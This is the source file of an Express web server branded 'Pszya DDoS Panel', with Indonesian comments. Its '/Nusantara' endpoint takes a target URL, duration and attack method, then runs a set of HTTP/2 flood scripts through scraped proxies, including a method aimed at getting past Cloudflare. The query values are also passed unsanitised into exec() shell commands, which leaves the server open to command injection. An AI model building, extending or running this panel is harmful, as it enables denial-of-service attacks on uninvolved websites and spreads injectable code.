const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 8080;

// Endpoint root
app.get('/', (req, res) => {
  res.status(200).json({
    name: 'Pszya DDoS Panel',
    version: '1.0',
    status: 'online',
    endpoint: '/Nusantara?target=<url>&time=<seconds>&methods=<method>',
    available_methods: ['PRIV-VGOR', 'PRIV-CLOUDFLARE']
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

// Main attack endpoint dengan auto proxy update
app.get('/Nusantara', (req, res) => {
  const { target, time, methods } = req.query;

  // Validasi parameter
  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: 'target, time, methods'
    });
  }

  console.log(`[ATTACK] ${methods} -> ${target} for ${time}s`);

  // Kirim response langsung
  res.status(200).json({
    status: 'success',
    message: 'Attack launched',
    target,
    time,
    methods
  });

  // Auto update proxies lalu execute attack
  updateProxies(() => {
    executeAttack(target, time, methods);
  });
});

// Fungsi update proxies sederhana
function updateProxies(callback) {
  console.log('[PROXY] Auto-updating proxies...');
  
  // Jalankan proxy.js jika ada
  if (fs.existsSync('methods/scrape.js')) {
    exec('node methods/scrape.js', (error, stdout, stderr) => {
      if (error) {
        console.log('[PROXY] Error:', error.message);
      }
      if (stdout) {
        console.log('[PROXY]', stdout);
      }
      if (stderr) {
        console.log('[PROXY]', stderr);
      }
      console.log('[PROXY] Proxy update completed');
      callback();
    });
  } else {
    console.log('[PROXY] scrape.js not found, skipping update');
    callback();
  }
}

// Fungsi execute attack menggunakan EXEC
function executeAttack(target, time, method) {
  const cleanTarget = target.replace(/^https?:\/\//, '');
  
  console.log(`[EXECUTE] Starting ${method} attack`);
  
  try {
    switch(method.toUpperCase()) {
      case 'PRIV-VGOR':
        console.log('[EXECUTE] Running H2-DOLBY methods...');
        
        exec(`node methods/floodernew.js GET ${cleanTarget} ${time} 16 4 proxy.txt --query 1 --debug`);
        exec(`node methods/rapid.js POST ${cleanTarget} ${time} 8 4 proxy.txt --query 1 --randrate --full --legit`);
        exec(`node methods/h2-nust.js ${cleanTarget} ${time} 17 3 proxy.txt`);
        break;

      case 'PRIV-CLOUDFLARE':
        console.log('[EXECUTE] Running H2-BIPAS methods...');
        
        exec(`node methods/h2-nust.js ${cleanTarget} ${time} 17 2 proxy.txt`);
        exec(`node methods/light.js ${cleanTarget} ${time} 9 2 proxy.txt`);
        exec(`node methods/v-hold.js ${cleanTarget} ${time}`);
        break;

      default:
        console.log(`[ERROR] Unknown method: ${method}`);
    }
    
    console.log('[EXECUTE] All commands executed');
  } catch (error) {
    console.log(`[ERROR] Attack execution failed: ${error.message}`);
  }
}

// Endpoint untuk manual proxy update
app.get('/update-proxies', (req, res) => {
  updateProxies(() => {
    res.json({ status: 'success', message: 'Proxies updated' });
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`ðŸš€ Pszya DDoS Panel running on port ${port}`);
  console.log(`ðŸ“ Local: http://localhost:${port}`);
  console.log(`âš¡ Attack: http://localhost:${port}/Nusantara`);
  console.log(`ðŸ”„ Manual Proxy Update: http://localhost:${port}/update-proxies`);
  console.log(`â¤ï¸  Health: http://localhost:${port}/health`);
});
